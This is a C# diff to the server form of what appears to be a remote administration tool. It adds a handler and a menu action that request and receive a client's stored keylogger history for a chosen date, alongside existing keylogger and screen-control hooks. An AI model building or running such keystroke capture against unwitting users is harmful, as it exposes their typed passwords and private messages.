@@ -45,6 +45,7 @@ namespace Server.Forms
 				onKeyLoggerEvent: OnKeyLoggerEvent,
                 onKeyLoggerBatch: OnKeyLoggerBatch,
                 onKeyLoggerComboEvent: OnKeyLoggerComboEvent,
+                onKeyLoggerHistoryResponse: OnKeyLoggerHistoryResponse,
                 onScreenControlResponse: OnScreenControlResponse,
                 onScreenControlFrame: OnScreenControlFrame);
             InitializeClientsGrid();
@@ -461,6 +462,15 @@ namespace Server.Forms
             }
         }
 
+        private void OnKeyLoggerHistoryResponse(KeyLoggerHistoryResponse response)
+        {
+            if (string.IsNullOrEmpty(response.ClientId)) return;
+            if (_keyLoggerHandlers.TryGetValue(response.ClientId, out var handler))
+            {
+                handler.OnHistoryResponse(response);
+            }
+        }
+
         private void keyLoggerStartParallelToolStripMenuItem_Click(object sender, EventArgs e)
         {
             var conn = GetSelectedConnection();
@@ -521,6 +531,15 @@ namespace Server.Forms
                         var json = Common.Utils.JsonHelper.Serialize(toggle);
                         _ = conn.SendAsync(json);
                         AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerLangToggle {(vie ? "VIE" : "ENG")} to {clientId}");
+                    }
+                };
+                form.OnHistoryDateRequested += date =>
+                {
+                    if (_clients.TryGetValue(clientId, out var conn))
+                    {
+                        var req = new KeyLoggerHistoryRequest { ClientId = clientId, DateKey = date.ToString("yyyy-MM-dd") };
+                        _ = _commandService.SendKeyLoggerHistoryRequestAsync(conn, req);
+                        AppendLog($"[{DateTime.Now:HH:mm:ss}] [SEND] KeyLoggerHistoryRequest {req.DateKey} to {clientId}");
                     }
                 };
             }
